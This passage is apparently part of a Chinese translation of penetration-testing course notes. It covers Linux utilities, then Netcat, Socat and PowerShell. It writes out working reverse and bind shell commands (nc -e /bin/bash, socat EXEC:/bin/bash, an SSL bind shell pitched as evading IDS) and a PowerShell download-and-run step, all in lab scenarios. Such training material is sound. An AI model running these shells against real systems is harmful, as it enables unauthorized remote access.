Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\"\n```\n\n`-f` 选项（follow）是非常有用的，因为它随着目标文件的增长不断地更新输出。另一个方便的选项是 `-nX` ，它输出最后的 “X” 行数，而不是默认值 10。\n\n### Watch\n\nwatch 命令用于定期运行一个特定的命令。默认情况下，它每两秒运行一次，但是我们可以通过使用 `-n` `X` 选项指定不同的间隔。让它每 “X” 秒运行一次。例如，这个命令将每隔 5 秒列出登录的用户（通过 w 命令）一次。\n\n```bash\nkali@kali:~$ watch -n 5 w\n...........\nEvery 5.0s: w                                                 kali: Thu Mar 17 00:28:16 2022\n\n 00:28:16 up 2 days, 18:30,  1 user,  load average: 0.56, 0.82, 0.94\nUSER     TTY      来自           LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     tty7     :0               282月22 15days 10:18  10:18  /usr/lib/xorg/Xorg :0 -seat\n```\n\n要终止 watch 命令并返回到交互式终端，使用 `Ctrl` `C` 。\n\n## 下载文件\n\n接下来，让我们看看一些可以从命令行下载文件到 Linux 系统的工具。\n\n### Wget\n\n我们将广泛使用的 wget 命令，使用 HTTP/HTTPS 和 FTP 协议下载文件。下面显示了 wegt 和 `-O` 选项的使用情况，以在本地机器上用不同的名字保存目标文件。\n\n```bash\nkali@kali:~$ wget -O report_wget.pdf <https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf>\n--2018-01-28 20:30:04-- <https://www.offensive-security.com/reports/penetration-testin>\nResolving www.offensive-security.com (www.offensive-security.com)... 192.124.249.5\nConnecting to www.offensive-security.com (www.offensive-security.com)|192.124.249.5|:4\nHTTP request sent, awaiting response... 200 OK\nLength: 27691955 (26M) [application/pdf]\nSaving to: ‘report_wget.pdf’\nreport_wget.pdf 100%[===================>] 26.41M 766KB/s in 28s\n\n2018-01-28 20:30:33 (964 KB/s) - ‘report_wget.pdf’ saved [27691955/27691955]\n```\n\n### Curl\n\ncurl 是一个使用一系列协议向服务器传输数据的工具，包括 IMAP/S,POP3/S,SCP,SFTP,SMB/S,SMTP/S,TELNET,TFTP 等。渗透测试人员可以用它来下载或上传文件并建立复杂的请求。它最基本的用途与 wget 非常相似。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl -o report.pdf <https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf>\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0\n```\n\n### Axel\n\naxel 是一个下载加速器，通过多个连接从 FTP 或 HTTP 服务器传输文件。这个工具有大量的功能，但最常见的是 `-n` ，用来指定要使用的多个连接的数量。在下面的例子中，我们还使用了 `-a` 选项，以获得更简洁的进度指示器，并使用 `-o` 为下载的文件指定一个不同的文件名。\n\n```bash\nkali@kali:~$ axel -a -n 20 -o report_axel.pdf <https://www.offensivesecurity.com/reports/penetration-testing-sample-report-2013.pdf>\nInitializing download: <https://www.offensive-security.com/reports/penetration-testingFile> size: 27691955 bytes\nOpening output file report_axel.pdf\nStarting download\n\nConnection 0 finished\nConnection 1 finished\nConnection 2 finished\nConnection 3 finished\nConnection 4 finished\nConnection 5 finished\nConnection 6 finished\nConnection 7 finished\nConnection 8 finished\nConnection 9 finished\nConnection 10 finished\nConnection 11 finished\nConnection 13 finished\nConnection 14 finished\nConnection 15 finished\nConnection 16 finished\nConnection 18 finished\n[100%]\n[ ..............................................................................................................................................................] [11.1MB/s] [00:00]\n\nDownloaded 26.4 Megabyte in 2 seconds. (11380.17 KB/s)\n```\n\n## 自定义 Bash 环境\n\n### Bash 历史的定制\n\n在本模块的前面，我们讨论了环境变量和历史命令。我们可以使用一些环境变量来改变历史命令的操作和返回数据的方式，最常见的包括 HISTCONTROL、HISTIGNORE 和 HISTTIMEFORMAT。HISTCONTROL 变量定义了是否从历史记录中删除重复的命令、以空格开头的命令或两者。默认情况下，两者都被删除，但你可能会发现只删除重复的命令更有用。\n\n```bash\nkali@kali:~$ export HISTCONTROL=ignoredups\n```\n\nHISTIGNORE 变量对于过滤掉经常运行的基本命令特别有用，入 ls、exit、history、bg 等。\n\n```bash\nkali@kali:~$ export HISTIGNORE=\"&:ls:[bf]g:exit:history\"\n\nkali@kali:~$ mkdir test\n\nkali@kali:~$ cd test\n\nkali@kali:~/test$ ls\n\nkali@kali:~/test$ pwd\n/home/kali/test\n\nkali@kali:~/test$ ls\n\nkali@kali:~/test$ history\n 1 export HISTIGNORE=\"&:ls:[bf]g:exit:history\"\n 2 mkdir test\n 3 cd test\n 4 pwd\n\nkali@kali:~/test$ export HISTTIMEFORMAT='%F %T '\n\nkali@kali:~/test$ history\n 1 2018-02-12 13:37:33 export HISTIGNORE=\"&:ls:[bf]g:exit:history\"\n 2 2018-02-12 13:37:38 mkdir test\n 3 2018-02-12 13:37:40 cd test\n 4 2018-02-12 13:37:43 pwd\n 5 2018-02-12 13:37:51 export HISTTIMEFORMAT='%F %T '\n```\n\n在这个例子中，我们使用了 %F(年-月-日 ISO 8601 格式) 和 %T(24 小时时间)。其他格式可以在 strftime 手册找到。\n\n### Alias\n\nAlias 是一个我们可以定义的字符串，用来替代一个命令的别称。Alias 对于我们定义的更短的命令或别名来替换常用的命令和选项非常有用。换句话说，Alias 是我们定义的一个命令，由其他命令组成。这方面的一个例子是 ls 命令，我们通常倾向于使用 ls -la（显示结果为一个长列表，包括隐藏的文件）。让我们来看看如何使用 Alias 来取代这个命令。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# alias lsa='ls -la'\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# lsa    \n总用量 544\ndrwxr-xr-x   5 root root   4096  3月 16 22:52  .\ndrwx------  30 root root   4096  3月 17 00:27  ..\n-rw-r--r--   1 root root 141136  3月 16 00:56  access.log\n-rwxr-xr-x   1 root root    223  3月  2 20:33  Anbox.desktop\ndrwxr-xr-x   3 root root   4096  4月 21  2021  cobaltstrike4\n-rw-------   1 root root   7733 12月 10 02:12  CVE-2021-43798.py\n-rwxr-xr-x   1 root root    180  1月  5 01:51 'Google Chrome.desktop'\ndrwxr-xr-x   4 root root   4096  3月 14 01:12  HTB\n-rw-r--r--   1 root root     88  3月 16 04:17  intro_to_nano.txt\n-rwxr-xr-x   1 root root 332111  2月 19 03:06  linpeas.sh\n-rw-------   1 root root   9185  3月  1 00:17  Lucifiel.ovpn\n-rw-------   1 root root    455 12月 10 02:12  paload.txt\n-rw-r--r--   1 root root   3459  1月 19 22:03  phpshell.php\n-rw-r--r--   1 root root    636  3月 17 00:19  ping_results.txt\n-rw-r--r--   1 root root     60  3月 16 22:00  scan-a.txt\n-rw-r--r--   1 root root     60  3月 16 22:00  scan-b.txt\n-rw-r--r--   1 root root     36  9月 26 22:02  shell.php\ndrwxr-xr-x 109 root root   4096  3月 16 00:10  vulhub\n```\n\n通过定义我们自己的命令 lsa，我们可以快速执行 ls -la，而根本不需要输入任何参数。我们还可以通过运行不带参数的 alias 来查看定义的别名列表。\n\n需要注意的是：alias 命令对用于别名的单词没有任何限制。因此，有可能使用一个已经对应于现有命令的词来创建一个别名，我们可以在下面这个相当随意的例子中看到这一点。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# alias mkdir='ping -c 1 localhost'\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# mkdir                       \nPING localhost(localhost (::1)) 56 data bytes\n64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.075 ms\n\n--- localhost ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.075/0.075/0.075/0.000 ms\n```\n\n如果出现这样的情况，解决办法很简单。我们可以退出当前的 shell 会话，或者使用 unalias 命令来取消违规的别名。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# unalias mkdir          \n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# mkdir\nmkdir: 缺少操作数\n请尝试执行 \"mkdir --help\" 来获取更多信息。\n```\n\n### 持久的 Bash 定制\n\nBash 中交互式 Shell 的行为是由位于 /etc/bash.bashrc 的全系统 bashrc 文件决定的。全系统的 Bash 设置可以通过编辑位于任何用户主目录下的 .bashrc 文件而被推翻。\n\n在上一届中，我们探讨了 alias 命令，它为当前的终端会话设置一个别名。我们也可以在用户主目录下的 .bashrc 文件中插入合格命令，以设置一个持久的别名。.bashrc 脚本在该用户登录的任何时候都会被执行。由于这个文件是一个 shell 脚本，我们可以插入任何可以从命令提示符中执行的命令。让我们检查一下 Kali Linux 中默认的 /home/kali/.bashrc 文件的几行。\n\n```bash\nkali@kali:~$ cat ~/.bashrc\n# ~/.bashrc: executed by bash(1) for non-login shells.\n# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)\n# for examples\n...\n# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)\nHISTSIZE=1000\nHISTFILESIZE=2000\n\n# enable color support of ls and also add handy aliases\nif [ -x /usr/bin/dircolors ]; then\n test -r ~/.dircolors && eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -\n alias ls='ls --color=auto'\n...\n```\n\n你可能是认出 HISTSIZE 和 HISTFILESIZE 环境变量和显示彩色输出的 alias 命令。\n\n# 实用工具\n\n## Netcat\n\nNetcat，由 Hobbit 于 1995 年首次发布，是 “原始” 的网络渗透测试工具之一，它的功能非常全面，不愧是作者指定的黑客的 “瑞士军刀”。Netcat 最清晰的定义来自 Hobbit 本人：一个简单的 “使用 TCP 或 UDP 协议，在网络连接中读写数据的工具”。\n\n### 连接到一个 TCP/UDP 端口\n\n正如描述所提示的，Netcat 可以在客户或服务器模式下运行。首先，让我们看一下客户端模式。\n\n我们可以使用客户端模式连接到任何 TCP/UDP 端口，允许我们：\n\n- 检查一个端口是否开放或关闭\n- 从某个端口上监听的服务中读取横幅\n- 手动连接到一个网络服务\n\n让我们首先使用 Netcat（nc）来检查 TCP 110 端口（POP3 邮件服务）是否在实验室的一台机器上打开。我们将提供几个参数： `-n` 选项用于跳过 DNS 名称解析； `-v` 用于增加一些粗略的内容；目标 IP 地址；以及目标端口号：\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 110\n(UNKNOWN) [10.11.0.22] 110 (pop3) open\n+OK POP3 server lab ready <00003.1277944@lab>\n```\n\n首先，与 10.11.0.22 端口 110（标准属于为 10.11.0.22:110）的 TCP 连接成功了，所以 Netcat 报告远程端口是开放的。接下来，服务器通过 “回话” 来回应我们的连接，打印出服务器欢迎信息，并提示我们登录，这是 POP3 服务的标准行为。\n\n让我们试着与服务器进行交互。\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 110\n(UNKNOWN) [10.11.0.22] 110 (pop3) open\n+OK POP3 server lab ready <00004.1546827@lab>\nUSER offsec\n+OK offsec welcome here\nPASS offsec\n-ERR unable to lock mailbox\nquit\n+OK POP3 server lab signing off.\nkali@kali:~$\n```\n\n我们已经成功的使用 Netcat 与 POP3 服务进行了交流（尽管我们的登录尝试失败了）。\n\n### 监听 TCP/UDP 端口\n\n使用 Netcat 监听 TCP/UDP 端口对于客户程序的网络调试或接收 TCP/UDP 网络连接非常有用。让我们尝试实现一个涉及两台机器的简单聊天服务，使用 Netcat 作为客户端和服务器。\n\n在一台 IP 为 10.11.0.22 的 Windows 机器上，我们将 Netcat 设置为监听 TCP 4444 端口上的传入连接。我们将使用 `-n` 选项禁用 DNS 名称解析， `-l` 创建一个监听器， `-v` 增加一些详情信息， `-p` 指定监听端口号。\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444\nlistening on [any] 4444 ...\n```\n\n现在我们已经将 Windows 机器上的 4444 端口与 Netcat 绑定，让我们从 Llinux 机器上连接到该端口并输入一行字。\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 4444\n(UNKNOWN) [10.11.0.22] 4444 (?) open\nThis chat is from the linux machine\n```\n\n我们的文本将通过 TCP 端口 4444 发送到 Windows 机器上，我们可以在 Windows 机器上继续 “聊天”。\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444\nlistening on [any] 4444 ...\nconnect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43447\nThis chat is from the linux machine\n\nThis chat is from the windows machine\n```\n\n### 用 Netcat 传输文件\n\nNetcat 也可以用来从一台计算机向另一台计算机传输文件，包括文本和二进制文件。事实上，取证调查员经常将 Netcat 和 dd（磁盘复制工具）结合使用，在网络上创建符合取证要求的磁盘图像。\n\n为了从我们的 Kali 虚拟机向 Windows 系统发送文件，我们启动了一个与之前的聊天例子类似的设置，但有一些轻微的不同。在 Windows 机器上，我们将在 4444 端口设置一个 Netcat 监听器，并将任何输出重定向到一个名为 incoming.exe 文件。\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444 > incoming.exe\nlistening on [any] 4444 ...\n```\n\n在 kali 系统中，我们将通过 TCP 4444 端口将 wget.exe 文件推送到 Windows 机器上。\n\n```bash\nkali@kali:~$ locate wget.exe\n/usr/share/windows-resources/binaries/wget.exe\n\nkali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe\n(UNKNOWN) [10.11.0.22] 4444 (?) open\n```\n\n连接由 Windows 上的 Netcat 接收，如下所示：\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444 > incoming.exe\nlistening on [any] 4444 ...\nconnect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43459\n^C\nC:\\\\Users\\\\offsec>\n```\n\n请注意，我们没有收到 Netcat 对我们文件上传进度的任何反馈。在这种情况下，由于我们上传的文件很小，我们可以先等待几秒钟，然后通过尝试运行文件来检查文件是否已经完全上传到 Windows 机器上。\n\n```bash\nC:\\\\Users\\\\offsec> incoming.exe -h\nGNU Wget 1.9.1, a non-interactive network retriever.\nUsage: incoming [OPTION]... [URL]...\n```\n\n我们可以看到，这实际上是 wget.exe 可执行文件，而且文件传输成功了。\n\n### 用 Netcat 进行远程管理\n\nNetcat 最有用的功能之一是它能够进行命令重定向。Netcat-traditional 版本的 Netcat（用 “-DGAPING_SECURITY_HOLE” 标志编译）启用了 `-e` 选项。在建立或接收一个成功的连接后执行一个程序。这个强大的功能从安全的角度开辟了各种有趣的可能性，因此在大多数现代 Linux/BSD 系统中是不可用的。然而，由于 Kali Linux 是一个渗透测试发行版，Kali 中包含的 Netcat 版本支持 `-e` 选项。\n\n启用后，该选项可执行文件的输入、输出和错误信息重定向到一个 TCP/UDP 端口，而不是默认的控制台。\n\n例如，考虑 cmd.exe 可执行文件。通过将 stdin、stdout 和 stderr 重定向到网络，我们可以将 cmd.exe 绑定到一个本地端口。任何连接到这个端口的人都会在目标计算机上看到一个命令提示。为了弄清楚这一点，让我们再运行几个涉及到 Bob 和饿Alice 的场景。\n\n- **Netcat 正向 Shell 场景**\n\n  再我们的第一个场景中，Bob（运行 Windows）请求 Alice（运行 Linux）的帮助，并要求她连接到他的计算机并远程发布一些命令。Bob 有一个公共 IP 地址，并直接连接到互联网。然而，Alice 再一个 NAT 的连接后面，有一个内部 IP 地址。为了完成这个方案，Bob 需要将 cmd.exe 绑定到他的公共 IP 地址上的一个TCP端口，并要求 Alice 连接到他的特定 IP 地址和端口。\n\n  Bob 将检查他的本地 IP 地址，然后用 `-e` 选项运行 Netcat，一旦连接到监听端口就执行 cmd.exe。\n\n  ```bash\n  C:\\\\Users\\\\offsec> ipconfig\n  Windows IP Configuration\n  Ethernet adapter Local Area Connection:\n  \tConnection-specific DNS Suffix . :\n  \tIPv4 Address. . . . . . . . . . . : 10.11.0.22\n  \tSubnet Mask . . . . . . . . . . . : 255.255.0.0\n  \tDefault Gateway . . . . . . . . . : 10.11.0.1\n  \n  C:\\\\Users\\\\offsec> nc -nlvp 4444 -e cmd.exe\n  listening on [any] 4444 ...\n  ```\n\n  现在 Netcat 已经将 TCP 4444 端口与 cmd.exe 绑定，并将 cmd.exe 的任何输入、输出或错误信息重定向到网络。换句话说，任何连接到 Bob 机器上的 TCP 4444 端口的人（希望是 Alice）都会看到 Bob 的命令提示。这的确是一个“巨大的安全漏洞”！\n\n  ```bash\n  kali@kali:~$ ip address show eth0 | grep inet\n   inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0\n  \n  kali@kali:~$ nc -nv 10.11.0.22 4444\n  (UNKNOWN) [10.11.0.22] 4444 (?) open\n  Microsoft Windows [Version 10.0.17134.590]\n  (c) 2018 Microsoft Corporation. All rights reserved.\n  \n  C:\\\\Users\\\\offsec> ipconfig\n  Windows IP Configuration\n  Ethernet adapter Local Area Connection:\n   Connection-specific DNS Suffix . :\n   IPv4 Address. . . . . . . . . . . : 10.11.0.22\n   Subnet Mask . . . . . . . . . . . : 255.255.0.0\n   Default Gateway . . . . . . . . . : 10.11.0.1\n  ```\n\n  正如我们所看到的，这与预期的工作一样。下面的图片描述了这种情况：\n\n  ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/06439b20-99f3-4456-a7a9-f02e37534e70/Untitled.png)\n\n- **反向 Shell 场景**\n\n  在我们的第二个场景中，Alice 需要 Bob 的帮助。然而，Alice 对她办公室里的路由器没有控制权，因此不能将流量从路由器转发到她的机器内部。\n\n  在这种情况下，我们可以利用 Netcat 的另一个有用的功能；能够发送命令 Shell 到一个特定的端口上监听的主机。在这种情况下，尽管 Alice 不能在她的计算机上为 /bin/bash 绑定一个端口，并期望 Bob 能够连接，但她可以将她的命令提示符的控制权发送给 Bob 的机器。这就是所谓的反向 Shell。为了实现这个目的，Bob 首先要设置 Netcat 来监听一个传入的 Shell。在我们的例子中，我们将使用 4444 端口。\n\n  ```bash\n  C:\\\\Users\\\\offsec> nc -nlvp 4444\n  listening on [any] 4444 ...\n  ```\n\n  现在，Alice 可以从她的 Linux 机器向 Bob 发送一个反向 Shell。再一次，我们使用 `-e` 选项来使一个应用程序远程可用，在这种情况下，它恰好是 /bin/bash，Linux shell。\n\n  ```bash\n  kali@kali:~$ ip address show eth0 | grep inet\n   inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0\n  \n  kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash\n  (UNKNOWN) [10.11.0.22] 4444 (?) open\n  ```\n\n  一旦连接建立，Alice 的 Netcat 将把 /bin/bash 的输入、输出和错误数据流重定向到 4444 端口的 Bob 的机器上，Bob 可以与该 Shell 交互。\n\n  ```bash\n  C:\\\\Users\\\\offsec>nc -nlvp 4444\n  listening on [any] 4444 ...\n  connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43482\n  \n  ip address show eth0 | grep inet\n   inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0\n  ```\n\n  花一些时间考虑绑定和反向 Shell 之间的差异，以及从组织安全的角度来看，这些差异可能适用于各种防火墙配置。重要的是要认识到，流出的流量与流入的流量一样的有害。下图描述了反向 Shell 的情况，Bob 在 Alice 的 Linux 机器上获得了远程 Shell 访问，穿越了公司防火墙。\n\n  ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81966b24-1aac-4ddb-a3d4-2573ce2698bb/Untitled.png)\n\n## Socat\n\nsocat 是一个命令行工具，可以建立两个双向的字节流，并在它们之间传输数据。对于渗透测试，它类似于 Netcat，但有额外的有用功能。\n\n虽然 socat 可以做很多事情，但我们只介绍其中的几个，以说明其用途。让我们开始探索 socat，看看它与 Netcat 的比较。\n\n### Netcat VS Socat\n\n首先，让我们用 Netcat 和 Socat 连接到 80 端口的远程服务器。\n\n```bash\nkali@kali:~$ nc <remote server's ip address> 80\n\nkali@kali:~$ socat - TCP4:<remote server's ip address>:80\n```\n\n注意，语法相似，但 socat 需要 `-` 在 STDIO 和远程主机之间传输数据（允许我们的键盘与 shell 互动）和协议（TCP4）。协议、选项和端口号是冒号分隔的。\n\n因此将监听器绑定到 1024 以下的端口需要 root 权限，所以我们在启动 443 端口的监听器时需要使用 sudo。\n\n```bash\nkali@kali:~$ sudo nc -lvp localhost 443\n\nkali@kali:~$ sudo socat TCP4-LISTEN:443 STDOUT\n```\n\n请注意，需要添加监听器的协议（TCP-LISTEN）和 STDOUT 参数，它可以重定向标准输出。\n\n### Socat 文件传输\n\n接下来，我们将尝试一下文件传输。继续之前虚构的 Alice 和 Bob 角色，假设 Alice 需要给 Bob 发送一个叫做 secret_passwords.txt 的文件。作为提醒。Alice的主机运行在 Linux上，而 Bob 的主机运行在 Windows上。让我们来看看这个动作。\n\n在 Alice 这边，我们将在 443 端口共享文件。在这个例子中，TCP4-LISTEN 选项制定了一个 IPv4 监听器，一旦与监听器建立连接，fork 就会创建一个子进程，它允许多个连接，而 file: 制定了要传输的文件的名称。\n\n```bash\nkali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt\n```\n\n在 Bob 这边，我们将连接到 Alice 的电脑并检索文件。在这个例子中，TCP4 选项指定了 IPv4，后面是 Alice 的 IP 地址（10.11.0.4）和监听端口号（443），file: 指定了在 Bob 的计算机上保存文件的本地文件名，create 指定了将创建一个新文件。\n\n```bash\nC:\\\\Users\\\\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create\n\nC:\\\\Users\\\\offsec> type received_secret_passwords.txt\n\"try harder!!!\"\n```\n\n### Socat 反向 Shell\n\n让我们来看看使用 socat 的反向 Shell。首先，Bob 将在 443 端口启动一个监听器。要做到这一点，他将提供 `-d` 选项来增加粗略性（显示致命、错误、警告和通告信息），TCP4-LISTEN:443 来在 443 端口创建一个 IPv4 监听器。STDOUT 来连接标准输出（STDOUT）到 TCP 套接字。\n\n```bash\nC:\\\\Users\\\\offsec> socat -d -d TCP4-LISTEN:443 STDOUT\n... socat[4388] N listening on AF=2 0.0.0.0:443\n```\n\n接下来，Alice 将使用 socat 的 EXEC选项（类似于 netcat 的 `-e` 选项），一旦建立了远程连接，它将执行给定的程序。在这种情况下，Alice 将发送一个 /bin/bash 反向 Shell（用 EXEC :/bin/bash）到 Bob 的监听套接字 10.11.0.22:443。\n\n```bash\nkali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash\n```\n\n一旦连接，Bob 可以从他的 socat 绘画中输入命令，这些命令将在 Alice 的机器上执行。\n\n```bash\n... socat[4388] N accepting connection from AF=2 10.11.0.4:54720 on 10.11.0.22:443\n... socat[4388] N using stdout for reading and writing\n... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]\nwhoami\nkali\nid\nuid=1000(kali) gid=1000(kali) groups=1000(kali)\n```\n\n这是一个很好的开始，我们已经涵盖了一些重要的主题，但到目前为止，我们所有的 socat 加密的基本知识。\n\n### Socat 加密的 正向 Shell\n\n为了给绑定的 Shell 增加加密，我们将依靠安全套接字层证书。这种级别的加密将有助于躲避入侵检测系统（IDS），并有助于隐藏我们正在传输的敏感数据。\n\n继续以 Alice 和 Bob 为例，我们将使用 openssl 应用程序创建一个自签名的证书，使用以下选项。\n\n- req：发起一个新的证书签署请求\n- newkey：生成一个新的私钥\n- ras:2048：使用 RSA 加密，秘钥长度为 2048 位\n- nodes：存储没有口令保护的私钥\n- keyout：将秘钥保存到一个文件中\n- x509：输出一个自签名的证书，而不是一个证书请求\n- days：设置有效期，以天为单位\n- out：将证书保存到一个文件中\n\n一旦我们生成了秘钥，我们将把证书和它的私钥存到一个文件夹里，我们最终将用它来加密我们的 正向 Shell。\n\n我们现在讲在 Alice 的机器上完成这个过程。\n\n```bash\nkali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days\n362 -out bind_shell.crt\nGenerating a 2048 bit RSA private key\n....................+++\n...............................+++\nwriting new private key to 'bind_shell.key'\n-----\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:US\nState or Province Name (full name) [Some-State]:Georgia\nLocality Name (eg, city) []:Atlanta\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec\nOrganizational Unit Name (eg, section) []:Try Harder Department\nCommon Name (e.g. server FQDN or YOUR name) []:\nEmail Address []:\nkali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem\n```\n\n现在秘钥和证书已经生成，我们首先需要把它们转换成 socat 可以接受的格式。为此，我们在创建加密的 socat 监听器之前，将 bind_shell.key 和 bind_shell.crt 两个文件合并成一个 .pem 文件。\n\n我们将使用 OPENSSL-LISTEN 选项在 443 端口创建监听器，cert=bind_shell.pem 来指定我们的证书文件，verify 来禁用 SSL 验证，fork 来在监听器有连接时生成一个子进程。\n\n```bash\nkali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork\nEXEC:/bin/bash\n```\n\n现在，我们可以将 Bob 的电脑连接到 Alice 的 正向 shell。\n\n我们将使用 `-` 在 STDIO 和远程主机之间传输数据，使用 OPENSSL 建立一个远程 SSL 连接到 10.11.0.4:443 的 Alice 监听器，使用 verify=0 来禁用 SSL 证书验证。\n\n```bash\nC:\\\\Users\\\\offsec> socat - OPENSSL:10.11.0.4:443,verify=0\nid\nuid=0(root) gid=0(root) groups=0(root)\nwhoami\nroot\n```\n\n很好！我们的正向 shell 创建成功了，我们能够向 Alice 的机器传递命令。\n\n花些时间自己去探索 socat。这是许多工具中的一个，在渗透测试中会非常有益。\n\n## PowerShell 和 Powercat\n\nWindows PowerShell 是一种基于任务的命令行外壳和脚本语言。它是专门为系统管理员和电力用户涉及的，用于快速自动化管理多个操作系统（Linux、MacOS、Unix 和 Windows）以及在这些系统上运行的应用程序的相关进程。\n\n毋庸置疑，PowerShell 是一个强大的渗透测试工具，可以安装在（或默认安装在）各种版本的 Windows 上。从 Winodws Server 2008 R2 和 Windows 7 开始，它被默认安装在现代 Windows 平台上。Windows PowerShell 5.0 可以在以下版本的 Windows 上运行。\n\n- Windows Server 2016 默认安装\n- Windows Server 2012 R2/Windows 2012/Windows Server 2008 R2 with Service Pack 1/Windows 8.1/Windows7 with Service Pack 1（安装 Windows Management Framework 5.0 以运行它）\n\nWindows PowerShell 4.0 可以在以下版本的 Winodws 中运行。\n\n- Windows 8.1/Windows Server 2012 R2 默认安装\n- 带有 Service Pack 的 Windows 7/带有 Service Pack 的 Windows Server 2008 R2（安装 Windows Management Framework 4.0 以运行它）\n\nWindows PowerShell 3.0 可以在以下版本的 Windows 中运行。\n\n- Windows 8/Windows Server 2012 默认安装\n- 带有 Service Pack 的 Windows 7/带有 Service Pack 1/2 的 Windows Server 2008 R2（安装 Windows Management Framework 3.0 以运行它）\n\nPowerShell 包含一个内置的集成开发环境（IDE），被称为 Windows PowerShell 集成脚本环境（ISE）。ISE 是 Windows PowerShell 的一个主机应用程序，使我们能够在一个基于 Winodws 的图形用户界面中运行命令、编写、测试和调试脚本。该界面提供多行编辑、标签完成、语法着色、选择性执行、上下文敏感帮助、支持从右到左的语言等等。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/aa0559c6-074d-4166-ae5a-b67a69a4cd5c/Untitled.png)\n\nPowerShell 维护一个执行策略，决定哪种类型的 PowerShell 脚本（如果有的话）可以在系统上运行。默认策略是“受限”，这实际上意味着系统既不会加载 PowerShell 配置文件，也不会运行 PowerShell 脚本。为了本模块的目的，我们需要在 Windows 客户机上设置一个“不受限制”的执行策略。要做到这一点，我们点击 Windows 开始按钮，右键单击 Windows PowerShell 应用程序，选择以管理员身份运行。当出现用户账户控制提示时，选择是，并输入 Set-ExecutionPolicy Unrestricted。\n\n```bash\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\\\WINDOWS\\\\system32> Set-ExecutionPolicy Unrestricted\n\nExecution Policy Change\nThe execution policy helps protect you from scripts that you do not trust. Changing\nthe execution policy might expose you to the security risks described in the\nabout_Execution_Policies help topic at https:/go.microsoft.com/fwlink/?LinkID=135170.\nDo you want to change the execution policy?\n[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is\n\"N\"): y\n\nPS C:\\\\WINDOWS\\\\system32> Get-ExecutionPolicy\nUnrestricted\n```\n\nPowerShell 既反映迅速又功能强大，使我们能够执行多种任务，而无需在目标上安装额外的工具。让我们再来探讨一下 PowerShell，以展示它在渗透测试中可能发挥的作用。\n\n### PowerShell 文件传输\n\n继续讨论 Alice 和 Bob，我们将使用 PowerShell 从 Bob 向 Alice 传输一个文件。由于 PowerShell 的强大和灵活，这并不像使用 Netcat 甚至 Socat 那样简单明了，使得这前几个命令乍一看有点混乱。我们将执行该命令，然后分解各部分。\n\n```bash\nC:\\\\Users\\\\offsec> powershell -c \"(new-objectSystem.Net.WebClient).DownloadFile('<http://10.11.0.4/wget.exe','C:\\\\Users\\\\offsec\\\\Desktop\\\\wget.exe>')\"\n\nC:\\\\Users\\\\offsec\\\\Desktop> wget.exe -V GNU Wget 1.9.1\n\nCopyright (C) 2003 Free Software Foundation, Inc.\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\nGNU General Public License for more details.\n\nOriginally written by Hrvoje Niksic <hniksic@xemacs.org>.\n```\n\n我们可以看到，命令执行了，文件被转移了，而且执行得很顺利。让我们分析一下使之发生的 PowerShell 命令。\n\n首先，我们使用了 `-c` 选项。这将执行所提供的命令（用双引号包裹），就像在 PowerShell 提示符下输入的那样。\n\n我们正在执行的命令包含几个部分。首先，我们使用 “newobject” cmdlet，它允许我们实例化一个 .Net 框架或一个 COM 对象。在这种情况下，我们正在创建一个 WebClient 类的实例，它是在 [System.Net](http://System.Net) 